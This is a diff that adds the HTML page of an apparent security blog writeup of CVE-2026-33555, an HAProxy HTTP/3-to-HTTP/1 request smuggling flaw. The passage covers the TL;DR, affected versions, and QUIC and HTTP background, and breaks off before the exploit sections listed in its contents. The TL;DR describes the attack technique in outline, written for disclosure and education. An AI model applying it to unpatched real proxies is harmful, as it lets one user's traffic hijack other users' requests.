@@ -1,0 +1,1055 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>HAProxy HTTP/3 -> HTTP/1 Desync: Cross-Protocol Smuggling via a Standalone QUIC FIN (CVE-2026-33555) | CyberSec Notes</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;500;700&family=JetBrains+Mono:wght@400&display=swap" rel="stylesheet">
+
+  <!-- Prism.js: theme + plugins CSS -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism-themes/1.5.0/prism-vsc-dark-plus.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/toolbar/prism-toolbar.min.css"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HAProxy HTTP/3 -&gt; HTTP/1 Desync: Cross-Protocol Smuggling via a Standalone QUIC FIN (CVE-2026-33555) | CyberSec Notes</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="HAProxy HTTP/3 -&gt; HTTP/1 Desync: Cross-Protocol Smuggling via a Standalone QUIC FIN (CVE-2026-33555)" />
+<meta name="author" content="Martino Spagnuolo" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="One zero-byte QUIC packet is enough to desynchronize HAProxy’s backend connection pool and smuggle HTTP requests across unrelated users — even users on a completely different frontend protocol." />
+<meta property="og:description" content="One zero-byte QUIC packet is enough to desynchronize HAProxy’s backend connection pool and smuggle HTTP requests across unrelated users — even users on a completely different frontend protocol." />
+<link rel="canonical" href="https://r3verii.github.io/cve/2026/04/14/haproxy-h3-standalone-fin-smuggling.html" />
+<meta property="og:url" content="https://r3verii.github.io/cve/2026/04/14/haproxy-h3-standalone-fin-smuggling.html" />
+<meta property="og:site_name" content="CyberSec Notes" />
+<meta property="og:image" content="https://r3verii.github.io/assets/2026-04-14-haproxy-h3-standalone-fin-smuggling/cover.jpg" />
+<meta property="og:image:height" content="633" />
+<meta property="og:image:width" content="1200" />
+<meta property="og:image:alt" content="HAProxy HTTP/3 -> HTTP/1 Desync: Cross-Protocol Smuggling via a Standalone QUIC FIN (CVE-2026-33555)" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-04-14T00:14:54+00:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://r3verii.github.io/assets/2026-04-14-haproxy-h3-standalone-fin-smuggling/cover.jpg" />
+<meta name="twitter:image:alt" content="HAProxy HTTP/3 -> HTTP/1 Desync: Cross-Protocol Smuggling via a Standalone QUIC FIN (CVE-2026-33555)" />
+<meta property="twitter:title" content="HAProxy HTTP/3 -&gt; HTTP/1 Desync: Cross-Protocol Smuggling via a Standalone QUIC FIN (CVE-2026-33555)" />
+<meta name="twitter:site" content="@r3verii" />
+<meta name="twitter:creator" content="@Martino Spagnuolo" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Martino Spagnuolo"},"dateModified":"2026-04-14T00:14:54+00:00","datePublished":"2026-04-14T00:14:54+00:00","description":"One zero-byte QUIC packet is enough to desynchronize HAProxy’s backend connection pool and smuggle HTTP requests across unrelated users — even users on a completely different frontend protocol.","headline":"HAProxy HTTP/3 -&gt; HTTP/1 Desync: Cross-Protocol Smuggling via a Standalone QUIC FIN (CVE-2026-33555)","image":{"width":1200,"height":633,"alt":"HAProxy HTTP/3 -> HTTP/1 Desync: Cross-Protocol Smuggling via a Standalone QUIC FIN (CVE-2026-33555)","url":"https://r3verii.github.io/assets/2026-04-14-haproxy-h3-standalone-fin-smuggling/cover.jpg","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://r3verii.github.io/cve/2026/04/14/haproxy-h3-standalone-fin-smuggling.html"},"url":"https://r3verii.github.io/cve/2026/04/14/haproxy-h3-standalone-fin-smuggling.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="icon" type="image/svg+xml" href="/assets/img/favicon.svg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicon-16x16.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/apple-touch-icon.png">
+  <link rel="shortcut icon" href="/assets/img/favicon.ico">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-JX6SC0211H"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-JX6SC0211H');
+</script>
+
+</head>
+<body class="line-numbers">
+  <aside class="sidebar">
+  <div class="sidebar-header">
+    <div class="sidebar-window-controls">
+      <span class="win-dot win-dot-close"></span>
+      <span class="win-dot win-dot-min"></span>
+      <span class="win-dot win-dot-max"></span>
+    </div>
+  </div>
+
+  <div class="sidebar-profile">
+    <img src="https://avatars.githubusercontent.com/u/143962203?v=4"
+         alt="Martino Spagnuolo" class="profile-pic">
+    <h3 class="author-name">Martino Spagnuolo</h3>
+    <p class="author-handle">@r3verii</p>
+    <p class="author-location">Italy 🇮🇹</p>
+    <p class="author-bio">Cybersec researcher, CTF player and bug hunter.</p>
+  </div>
+
+  <div class="sidebar-section-label">Places</div>
+  <nav class="sidebar-nav">
+    <a href="/"><span class="sidebar-icon">&#128193;</span> Home</a>
+    <a href="/about"><span class="sidebar-icon">&#128196;</span> About</a>
+  </nav>
+
+  <div class="sidebar-section-label">Files</div>
+  <nav class="folder-tree">
+    
+    
+      
+      
+      
+      
+      <details class="folder">
+        <summary class="folder-label">
+          <span class="folder-icon folder-icon-closed">&#128193;</span>
+          <span class="folder-icon folder-icon-open">&#128194;</span>
+          <span class="folder-name">bugbounty</span>
+          <span class="folder-count">2</span>
+        </summary>
+        <div class="folder-contents">
+          
+            <a href="/bugbounty/2025/10/18/zero-click-ato-gambling-platform.html"
+               class="file-item">
+              <span class="file-icon">&#128196;</span>
+              <span class="file-name">Zero‑Click ATO via Unbound Password‑R...</span>
+            </a>
+          
+            <a href="/bugbounty/2025/08/25/rxss-credential-stealer.html"
+               class="file-item">
+              <span class="file-icon">&#128196;</span>
+              <span class="file-name">From "Low-Impact" RXSS to Credential ...</span>
+            </a>
+          
+        </div>
+      </details>
+    
+      
+      
+      
+      
+      <details class="folder">
+        <summary class="folder-label">
+          <span class="folder-icon folder-icon-closed">&#128193;</span>
+          <span class="folder-icon folder-icon-open">&#128194;</span>
+          <span class="folder-name">ctf</span>
+          <span class="folder-count">2</span>
+        </summary>
+        <div class="folder-contents">
+          
+            <a href="/ctf/2024/04/01/utctf-writeup.html"
+               class="file-item">
+              <span class="file-icon">&#128196;</span>
+              <span class="file-name">UTCTF 2024 Writeups</span>
+            </a>
+          
+            <a href="/ctf/2023/10/08/eXSStravaganza.html"
+               class="file-item">
+              <span class="file-icon">&#128196;</span>
+              <span class="file-name">CodeInTheDarkCTF 2023 writeups</span>
+            </a>
+          
+        </div>
+      </details>
+    
+      
+      
+      
+      
+      <details class="folder" open>
+        <summary class="folder-label">
+          <span class="folder-icon folder-icon-closed">&#128193;</span>
+          <span class="folder-icon folder-icon-open">&#128194;</span>
+          <span class="folder-name">cve</span>
+          <span class="folder-count">5</span>
+        </summary>
+        <div class="folder-contents">
+          
+            <a href="/cve/2026/04/14/haproxy-h3-standalone-fin-smuggling.html"
+               class="file-item active">
+              <span class="file-icon">&#128196;</span>
+              <span class="file-name">HAProxy HTTP/3 -> HTTP/1 Desync: Cros...</span>
+            </a>
+          
+            <a href="/cve/2026/02/27/nodejs-toctou.html"
+               class="file-item">
+              <span class="file-icon">&#128196;</span>
+              <span class="file-name">The Forgotten Bug: How a Node.js Core...</span>
+            </a>
+          
+            <a href="/cve/2025/09/08/listmonk-cve-xss.html"
+               class="file-item">
+              <span class="file-icon">&#128196;</span>
+              <span class="file-name">CSRF → XSS → Admin Takeover in listmo...</span>
+            </a>
+          
+            <a href="/cve/2025/04/08/expoiting-wordpress.html"
+               class="file-item">
+              <span class="file-icon">&#128196;</span>
+              <span class="file-name">3 Ways In: Exploiting WordPress Plugi...</span>
+            </a>
+          
+            <a href="/cve/2024/03/20/znuny-cves.html"
+               class="file-item">
+              <span class="file-icon">&#128196;</span>
+              <span class="file-name">Znuny OTRS CVEs : CVE-2024-32491, CVE...</span>
+            </a>
+          
+        </div>
+      </details>
+    
+  </nav>
+
+  <div class="sidebar-section-label">Bookmarks</div>
+  <div class="social-links">
+    
+      <a href="https://www.linkedin.com/in/martino-spagnuolo/" target="_blank" rel="noopener">
+        <span class="sidebar-icon">&#127760;</span> LinkedIn
+      </a>
+    
+    
+      <a href="https://github.com/r3verii" target="_blank" rel="noopener">
+        <span class="sidebar-icon">&#128187;</span> GitHub
+      </a>
+    
+    <a href="/feed.xml" target="_blank" rel="noopener">
+      <span class="sidebar-icon">&#128225;</span> RSS Feed
+    </a>
+  </div>
+</aside>
+
+  <div class="sidebar-overlay"></div>
+
+  <div class="page-wrapper">
+    <header class="site-header">
+  <button class="hamburger" aria-label="Toggle menu" aria-expanded="false">
+    <span></span>
+    <span></span>
+    <span></span>
+  </button>
+
+  <a href="/" class="gnome-activities">Activities</a>
+
+  <nav class="gnome-menubar">
+    <a class="nav-item" href="/">Home</a>
+    <a class="nav-item" href="/about">About</a>
+    <a class="nav-item" href="https://github.com/r3verii" target="_blank" rel="noopener">GitHub</a>
+  </nav>
+
+  <span class="gnome-center-clock" id="gnome-clock"></span>
+
+  <div class="gnome-panel-right">
+    <span class="gnome-panel-indicator">&#128267;</span>
+    <span class="gnome-panel-indicator">&#128266;</span>
+    <span class="gnome-panel-indicator">&#9881;</span>
+  </div>
+</header>
+
+
+    <main class="content">
+      <article class="post">
+  <div class="post-window">
+    <div class="post-window-bar">
+      <span class="win-dot win-dot-close"></span>
+      <span class="win-dot win-dot-min"></span>
+      <span class="win-dot win-dot-max"></span>
+      <span class="post-window-title">HAProxy HTTP/3 -> HTTP/1 Desync: Cross-Protocol Smuggling...</span>
+    </div>
+    <div class="post-window-content">
+      <header class="post-header">
+        <h1 class="post-title">HAProxy HTTP/3 -> HTTP/1 Desync: Cross-Protocol Smuggling via a Standalone QUIC FIN (CVE-2026-33555)</h1>
+        <div class="post-meta">
+          <time datetime="2026-04-14T00:14:54+00:00">
+            April 14, 2026
+          </time>
+          
+            <span class="post-tag">cve</span>
+          
+        </div>
+      </header>
+      <div class="post-content">
+        <p><img src="/assets/2026-04-14-haproxy-h3-standalone-fin-smuggling/cover.png" alt="Cover" /></p>
+
+<blockquote>
+  <p><strong>TL;DR</strong> — A single QUIC STREAM frame with zero payload and the FIN bit set is enough to trick HAProxy into forwarding a <code class="language-plaintext highlighter-rouge">Content-Length: N</code> request with zero body bytes to the backend. The backend waits for N bytes that never come. The next user’s request on the same pooled TCP connection gets its first N bytes eaten as the missing body. Result: cross-user, cross-protocol HTTP request smuggling.</p>
+
+  <p><strong><a href="https://www.cve.org/CVERecord?id=CVE-2026-33555">CVE-2026-33555</a></strong>. Affected: HAProxy 2.6 through 3.3.5 with <code class="language-plaintext highlighter-rouge">USE_QUIC=1</code>. Fixed in 3.3.6 / 3.2.15 / 3.0.19 / 2.8.20 / 2.6.25.</p>
+</blockquote>
+
+<hr />
+
+<h2 id="table-of-contents">Table of contents</h2>
+
+<ul>
+  <li><a href="#0-what-this-post-is">0. What this post is</a></li>
+  <li><a href="#1-context">1. Context</a></li>
+  <li><a href="#2-the-networking-foundation">2. The networking foundation</a>
+    <ul>
+      <li><a href="#21-tcp-vs-udp-sockets-what-the-kernel-gives-you">2.1 TCP vs UDP sockets: what the kernel gives you</a></li>
+      <li><a href="#22-http11-one-request-at-a-time-per-connection">2.2 HTTP/1.1: one request at a time, per connection</a></li>
+      <li><a href="#23-http2-application-level-multiplexing">2.3 HTTP/2: application-level multiplexing</a></li>
+      <li><a href="#24-the-residual-problem-transport-level-hol-blocking">2.4 The residual problem: transport-level HoL blocking</a></li>
+      <li><a href="#25-http3--quic-streams-at-the-transport-layer">2.5 HTTP/3 / QUIC: streams at the transport layer</a></li>
+      <li><a href="#26-why-quic-had-to-be-on-udp">2.6 Why QUIC had to be on UDP</a></li>
+      <li><a href="#27-a-quic-packet-on-the-wire">2.7 A QUIC packet on the wire</a></li>
+      <li><a href="#28-offset-the-tape-metaphor">2.8 Offset: the tape metaphor</a></li>
+      <li><a href="#29-the-fin-bit-one-bit-wrong-layer">2.9 The FIN bit: one bit, wrong layer</a></li>
+    </ul>
+  </li>
+  <li><a href="#3-the-bug">3. The bug</a>
+    <ul>
+      <li><a href="#31-from-wire-to-h3_rcv_buf">3.1 From wire to h3_rcv_buf</a></li>
+      <li><a href="#32-two-layers-two-notions-of-done">3.2 Two layers, two notions of “done”</a></li>
+      <li><a href="#33-the-htx-trust-boundary">3.3 The HTX trust boundary</a></li>
+      <li><a href="#34-where-haproxy-validates-body-size">3.4 Where HAProxy validates body size</a></li>
+      <li><a href="#35-the-fast-path-that-skips-it">3.5 The fast-path that skips it</a></li>
+      <li><a href="#36-when-does-the-fast-path-trigger-back-to-the-protocol">3.6 When does the fast-path trigger? Back to the protocol</a></li>
+    </ul>
+  </li>
+  <li><a href="#4-the-exploit">4. The exploit</a>
+    <ul>
+      <li><a href="#41-the-connection-pool-problem">4.1 The connection pool problem</a></li>
+      <li><a href="#42-the-poc">4.2 The PoC</a></li>
+      <li><a href="#43-arbitrary-request-injection">4.3 Arbitrary request injection</a></li>
+      <li><a href="#44-configuration-required">4.4 Configuration required</a></li>
+    </ul>
+  </li>
+  <li><a href="#5-on-the-cvss-score">5. On the CVSS score</a></li>
+  <li><a href="#6-the-fix">6. The fix</a></li>
+  <li><a href="#7-disclosure-timeline">7. Disclosure timeline</a></li>
+  <li><a href="#8-takeaways">8. Takeaways</a></li>
+  <li><a href="#appendix-artifacts">Appendix: artifacts</a></li>
+</ul>
+
+<hr />
+
+<h2 id="0-what-this-post-is">0. What this post is</h2>
+
+<p>This is the writeup of a vulnerability I found in HAProxy and reported through coordinated disclosure. The HAProxy team confirmed the issue and it was assigned <a href="https://www.cve.org/CVERecord?id=CVE-2026-33555">CVE-2026-33555</a>.</p>
+
+<p>Most HTTP smuggling writeups jump straight to the exploit. This one starts from the ground up: what QUIC packets actually look like, how HAProxy processes them layer by layer, and why a single missing validation check in one fast-path creates a cross-user request smuggling primitive. If you’ve never looked at QUIC internals before, you should still be able to follow.</p>
+
+<p>If you just want the PoC: <a href="#4-the-exploit">jump to section 4</a>.</p>
+
+<hr />
+
+<h2 id="1-context">1. Context</h2>
+
+<p>I’ve been spending time this year on HTTP/2 and HTTP/3 attack surface in reverse proxies — specifically how protocol translation boundaries (H3→H1, H2→H1) can introduce semantic mismatches that neither side catches. HAProxy 3.x with <code class="language-plaintext highlighter-rouge">USE_QUIC=1</code> was a natural target: a relatively young, hand-rolled H3 implementation bridging QUIC stream semantics to HTTP/1.1 wire format. Two fundamentally different framing models, stitched together.</p>
+
+<p>The research was done almost entirely with Claude Code (Opus 4.6), which turned out to be remarkably effective at navigating a C codebase of this size (~8000 lines across the relevant mux files). I don’t know C deeply, and I certainly couldn’t hold the full architecture of HAProxy in my head. But I could ask precise questions about code paths, and Claude Code would trace them through function calls, line by line, and explain what each piece did. The vulnerability was found this way: not by fuzzing, but by reading the source and asking “does this validation always run?”</p>
+
+<p>The rest of this post is structured so that you can follow the whole thing with <strong>zero prior knowledge of QUIC</strong>. If you already know QUIC internals, section 2 will be review. If you don’t, it’s the foundation you need — the bug only makes sense once you understand why QUIC’s FIN bit lives at a completely different layer than HTTP/2’s END_STREAM flag, and why that layering choice gives an attacker packet-level control that HTTP/2 simply doesn’t expose.</p>
+
+<hr />
+
+<h2 id="2-the-networking-foundation">2. The networking foundation</h2>
+
+<blockquote>
+  <p><strong>Please note that what you are about to read is my understanding of the QUIC protocol</strong>, based on my reading of RFCs and other documents. I may have misinterpreted some of the theory, so please let me know if you notice any errors. The world of network protocols is vast, and I certainly know less than 1% of it. Furthermore, QUIC is a new protocol that is conceptually different from others and also very complex. I hope that someone will find these concepts useful for either deepening their understanding or coming up with new ideas ❤❤</p>
+</blockquote>
+
+<p>Before we can look at the bug, we need to understand three things:</p>
+
+<ol>
+  <li>How TCP and UDP sockets differ at the kernel level — this is the substrate QUIC runs on.</li>
+  <li>How HTTP evolved from 1.1 to 2 to 3, and what problem each version actually solved.</li>
+  <li>What a QUIC packet looks like on the wire, and where the FIN bit lives.</li>
+</ol>
+
+<figure style="margin:1.5rem auto;text-align:center">
+  <img src="/assets/2026-04-14-haproxy-h3-standalone-fin-smuggling/http-evolution-bytebytego.png" alt="HTTP/1 → HTTP/1.1 (persistent connection) → HTTP/2 (streams over one TCP connection) → HTTP/3 on QUIC (streams over UDP)" style="max-width:100%;height:auto" loading="lazy" />
+  <figcaption style="font-size:0.85em;opacity:0.75;margin-top:0.5rem">The four stages of HTTP evolution at a glance: from new-connection-per-request, to persistent connections, to H2 application-level streams over one TCP connection, to H3 streams riding directly on QUIC over UDP. Image credit: <a href="https://bytebytego.com/" target="_blank" rel="noopener">ByteByteGo</a>.</figcaption>
+</figure>
+
+<h3 id="21-tcp-vs-udp-sockets-what-the-kernel-gives-you">2.1 TCP vs UDP sockets: what the kernel gives you</h3>
+
+<p>A socket is a kernel object you access through a file descriptor. But <strong>what the kernel maintains behind that FD is fundamentally different</strong> for TCP and UDP.</p>
+
+<p>With TCP, each client connection gets its own FD on the server — the kernel maintains per-connection state (sequence numbers, buffers, congestion control). With UDP, <strong>one FD is shared across all clients</strong>; the application has to demultiplex incoming datagrams itself.</p>
+
+<p><img src="/assets/2026-04-14-haproxy-h3-standalone-fin-smuggling/tcp-vs-udp-sockets.svg" alt="TCP gives each client its own FD; UDP shares one FD across all clients." /></p>
+
+<p><strong>TCP: the socket is a connection.</strong> A <code class="language-plaintext highlighter-rouge">struct sock</code> (and its TCP-specific extension <code class="language-plaintext highlighter-rouge">struct tcp_sock</code>) is allocated by the kernel at <code class="language-plaintext highlighter-rouge">socket()</code> time, but it only becomes a fully-formed connection — bound to a <strong>4-tuple</strong> <code class="language-plaintext highlighter-rouge">(src_ip, src_port, dst_ip, dst_port)</code> — after <code class="language-plaintext highlighter-rouge">connect()</code> (client) or <code class="language-plaintext highlighter-rouge">accept()</code> (server) completes the 3-way handshake. From that point on the kernel tracks, per socket: a receive buffer holding the in-order, deduplicated bytes; a send buffer with pending writes; sequence numbers, window, RTT estimate, congestion control state, timers. When you call <code class="language-plaintext highlighter-rouge">read(fd, buf, 1024)</code>, the kernel hands you bytes from the byte stream. If the sender sent 500 bytes and another 500, you might receive all 1000 in one <code class="language-plaintext highlighter-rouge">read()</code>, or 500+500, or 327+173+500. <strong>TCP has no notion of “message.”</strong> It’s a byte stream, and the sender’s <code class="language-plaintext highlighter-rouge">send()</code> boundaries are gone.</p>
+
+<p><strong>UDP: the socket is a local endpoint.</strong> <code class="language-plaintext highlighter-rouge">bind(fd, 0.0.0.0:443, ...)</code> ties the socket to a <strong>2-tuple</strong> <code class="language-plaintext highlighter-rouge">(local_ip, local_port)</code>. No 4-tuple, because there is no connection. That socket receives datagrams from anyone sending to port 443. The kernel tracks a queue of received datagrams — each carries its source address. <strong>No inter-datagram ordering, no dedup, no retransmission, no congestion control.</strong> Each <code class="language-plaintext highlighter-rouge">recvmsg(fd, &amp;msg, 0)</code> returns <strong>exactly one datagram</strong>, intact, with its source address. <strong>UDP preserves message boundaries.</strong> If the sender does a single <code class="language-plaintext highlighter-rouge">sendto()</code>, you get it whole (or you lose it whole).</p>
+
+<p><strong>What this means for HAProxy.</strong> A TCP listener does the familiar dance: <code class="language-plaintext highlighter-rouge">listen()</code> + <code class="language-plaintext highlighter-rouge">accept()</code>. Each client gets its own FD. The poller notifies “this specific FD has data” → you know exactly which connection to process. A QUIC listener can’t do that. There is no <code class="language-plaintext highlighter-rouge">accept()</code> for UDP. HAProxy binds <strong>one UDP socket</strong>, and the poller just says “this FD has data” — but the data could belong to any of thousands of QUIC clients sharing that socket. Application code has to demultiplex.</p>
+
+<p>That’s why <code class="language-plaintext highlighter-rouge">quic_lstnr_sock_fd_iocb</code> in <code class="language-plaintext highlighter-rouge">src/quic_sock.c:469</code> loops:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">max_dgrams</span> <span class="o">=</span> <span class="n">global</span><span class="p">.</span><span class="n">tune</span><span class="p">.</span><span class="n">maxpollevents</span><span class="p">;</span>
+<span class="n">start</span><span class="o">:</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">quic_recv</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">dgram_buf</span><span class="p">,</span> <span class="n">max_sz</span><span class="p">,</span> <span class="p">...);</span>   <span class="c1">// one recvmsg → one datagram</span>
+    <span class="c1">// ... dispatch ...</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">--</span><span class="n">max_dgrams</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="k">goto</span> <span class="n">start</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>When the kernel wakes HAProxy saying “data available,” there might be 200 datagrams from 200 clients queued on that one socket. One <code class="language-plaintext highlighter-rouge">recvmsg()</code> pulls one of them. The <code class="language-plaintext highlighter-rouge">goto start</code> drains the queue up to <code class="language-plaintext highlighter-rouge">maxpollevents</code> to avoid thrashing the poller.</p>
+
+<p>QUIC’s <strong>Connection ID</strong> (DCID — Destination Connection ID) is what lets HAProxy figure out which connection a datagram belongs to. It lives in the header of every QUIC packet, and it’s what <code class="language-plaintext highlighter-rouge">quic_lstnr_dgram_dispatch</code> (<code class="language-plaintext highlighter-rouge">src/quic_sock.c:267</code>) extracts to look up the matching <code class="language-plaintext highlighter-rouge">struct quic_conn</code> in a tree. <strong>This software-level demultiplexing is what TCP gets for free from the kernel’s 4-tuple hashing</strong>, and what UDP forces you to do yourself.</p>
+
+<h3 id="22-http11-one-request-at-a-time-per-connection">2.2 HTTP/1.1: one request at a time, per connection</h3>
+
+<p>HTTP/1.1 over a single TCP connection processes <strong>one request at a time</strong>. Want parallelism? Open more TCP connections:</p>
+
+<p><img src="/assets/2026-04-14-haproxy-h3-standalone-fin-smuggling/http1-parallel-connections.svg" alt="HTTP/1.1: browser opens 6 parallel TCP connections; remaining resources wait." /></p>
+
+<p>Problems:</p>
+
+<ol>
+  <li><strong>6 TCP handshakes + 6 TLS handshakes</strong> = latency multiplied.</li>
+  <li><strong>6 separate congestion controls</strong> = each starts slow, none share information.</li>
+  <li><strong>Request N+7</strong> waits for a connection to free up.</li>
+  <li><strong>Workarounds</strong>: pipelining (rarely used — proxies were buggy), domain sharding (<code class="language-plaintext highlighter-rouge">cdn1.</code>, <code class="language-plaintext highlighter-rouge">cdn2.</code>, <code class="language-plaintext highlighter-rouge">cdn3.</code> to sidestep the 6-connection limit).</li>
+</ol>
+
+<p>This is <strong>application-level head-of-line blocking</strong>: request 7 waits because the HTTP/1 parser handles one at a time per connection.</p>
+
+<h3 id="23-http2-application-level-multiplexing">2.3 HTTP/2: application-level multiplexing</h3>
+
+<p>HTTP/2 introduces <strong>streams</strong> — numbered channels (1, 3, 5, 7… for client-initiated) that coexist on <strong>a single TCP connection</strong>. Everything you send is a binary frame with a 9-byte header that carries, among other things, a <strong>Stream ID</strong>:</p>
+
+<p><img src="/assets/2026-04-14-haproxy-h3-standalone-fin-smuggling/http2-frame-layout.svg" alt="HTTP/2 frame layout: 9-byte header with Length, Type, Flags, and Stream ID, followed by variable payload." /></p>
+
+<p>The server demuxes frames by Stream ID. You can have 100 requests in flight on one TCP connection. Wins vs. HTTP/1.1:</p>
+
+<ul>
+  <li>One TCP + TLS handshake.</li>
+  <li>One congestion control seeing everything.</li>
+  <li>Requests don’t block each other at the <strong>HTTP</strong> layer.</li>
+</ul>
+
+<h3 id="24-the-residual-problem-transport-level-hol-blocking">2.4 The residual problem: transport-level HoL blocking</h3>
+
+<p>HTTP/2 streams are an <strong>application-level fiction</strong>. They exist only inside the HTTP/2 parser. Underneath, there’s still a <strong>single TCP byte stream</strong>. TCP guarantees order and completeness on the whole byte stream, because it doesn’t even know streams exist.</p>
+
+<p>Consequence: if a <strong>TCP segment is lost</strong>, the receiver’s kernel has a gap in the buffer and <strong>blocks delivery of ALL bytes after the gap</strong> until the segment is retransmitted — even if those bytes belong to streams unrelated to the one that lost data.</p>
+
+<p><img src="/assets/2026-04-14-haproxy-h3-standalone-fin-smuggling/tcp-vs-quic-hol.svg" alt="TCP vs QUIC behavior on packet loss. TCP blocks all streams; QUIC blocks only the affected one." /></p>
+
+<p>Streams 2 and 3 on the TCP side are fine — their bytes arrived — but trapped behind stream 1’s gap because TCP serves everything in order. This is <strong>transport-level head-of-line blocking</strong>, and TCP cannot fix it: there’s no way to tell the kernel “skip the gap for stream 2.”</p>
+
+<h3 id="25-http3--quic-streams-at-the-transport-layer">2.5 HTTP/3 / QUIC: streams at the transport layer</h3>
+
+<p>QUIC breaks the “transport = one byte stream” assumption. QUIC <strong>implements streams inside the transport itself</strong>. A QUIC packet carries one or more <strong>frames</strong> (STREAM, ACK, PADDING, …). A single packet can carry data for different streams — but unlike TCP, each STREAM frame explicitly declares its stream ID and offset.</p>
+
+<p>When a packet is lost, QUIC detects it via ACKs and handles the gap per-stream. QUIC maintains a <strong>separate receive buffer per stream</strong>, and that architectural decision is what eliminates cross-stream HoL blocking (as the right panel above shows).</p>
+
+<p>A caveat worth knowing: QUIC eliminates HoL blocking <strong>between different streams</strong>, but <strong>not within the same stream</strong>. If stream 0 is missing the bytes at offset 0 but has received bytes at offset 500, stream 0 cannot deliver anything to the application — the application wants bytes in order from 0. The per-stream buffer in HAProxy is in fact a <strong>non-contiguous buffer</strong> (ncb) that accepts out-of-order writes and delivers the contiguous prefix when the gap fills. We’ll see this in section 3.5.</p>
+
+<h3 id="26-why-quic-had-to-be-on-udp">2.6 Why QUIC had to be on UDP</h3>
+
+<p>“Can’t we just add streams to TCP?” Engineers have been trying, on and off, for two decades. The attempts all teach the same lesson: two forces calcify TCP, and QUIC was designed to sidestep both.</p>
+
+<p><strong>Middlebox ossification.</strong> Between any client and any server sits an uncountable pile of firewalls, NATs, load balancers, DPI appliances, and transparent proxies. Each one inspects TCP against rules frozen at deployment time — sometimes decades ago. The moment you add a new TCP option or touch the header, some fraction of paths silently drop or mangle your packets. This was measured definitively by Honda, Nishida, Raiciu, Greenhalgh, Handley, and Tokuda in <a href="https://conferences.sigcomm.org/imc/2011/docs/p181.pdf"><em>“Is it still possible to extend TCP?”</em></a> (IMC 2011): unknown TCP options don’t reliably survive end-to-end, and more invasive changes fare much worse. Google’s own <a href="https://conferences.sigcomm.org/co-next/2011/papers/1569470675.pdf"><strong>TCP Fast Open</strong></a> (Radhakrishnan, Cheng, Chu, Jain, Raghavan, CoNEXT 2011) and the IETF’s <a href="https://datatracker.ietf.org/doc/html/rfc8684"><strong>Multipath TCP</strong></a> (RFC 8684; shipped by Apple for Siri in iOS 7) eventually reached production, but only after years of defensive engineering around middlebox breakage — and both still hit deployment walls in hostile networks. <a href="https://datatracker.ietf.org/doc/html/rfc4960"><strong>SCTP</strong></a>, an older streams-on-transport protocol from the telecom world, is beautiful on paper and essentially unroutable on the public internet for the same reason.</p>
+
+<p><strong>Kernel deployment velocity.</strong> TCP lives in the operating system kernel. Changing it means shipping updates to Linux, Windows, macOS, iOS, Android, BSD — and then waiting for operators to upgrade <strong>both endpoints</strong> of every connection. Windows XP was still meaningful traffic a decade after release; enterprise Linux fleets update on multi-year cycles. You cannot iterate a transport protocol at that speed.</p>
+
+<p><strong>QUIC’s escape hatch.</strong> <a href="https://docs.google.com/document/d/1RNHkx_VvKWyWg6Lr8SZ-saqsQx7rFV-ev2jRFUoVD34/preview">Jim Roskind</a>’s original 2012 Google design memo — later published as <a href="https://dl.acm.org/doi/10.1145/3098822.3098842"><em>“The QUIC Transport Protocol: Design and Internet-Scale Deployment”</em></a> (Langley, Riddoch, Wilk, Vicente, Krasic, Zhang, Yang, Kouranov, Swett, Iyengar et al., SIGCOMM 2017) — made three choices that directly target these walls:</p>
+
+<ol>
+  <li><strong>Ride UDP.</strong> Middleboxes let UDP through largely unexamined — too much critical infrastructure (DNS, video, games, VPNs) depends on it. A QUIC datagram looks, to an inspecting firewall, like any other opaque UDP payload.</li>
+  <li><strong>Put everything in user space.</strong> The QUIC state machine, stream multiplexing, loss recovery, congestion control — all of it is application code. A protocol update ships with a browser or server release, not a kernel release. Google could iterate QUIC inside Chrome and its frontends at a pace kernel-bound protocols can only dream of.</li>
+  <li><strong>Encrypt the transport header.</strong> QUIC integrates TLS 1.3 not as a layer on top but as part of the transport itself: packet numbers and nearly all frame data are authenticated-encrypted. This is not only for confidentiality — it is a deliberate defense against future ossification. If middleboxes cannot see into QUIC, they cannot build rules that depend on its format, and QUIC stays evolvable. <a href="https://datatracker.ietf.org/doc/html/rfc9170"><strong>RFC 9170</strong></a> (2021) later formalized this principle as IETF design guidance for future protocols.</li>
+</ol>
+
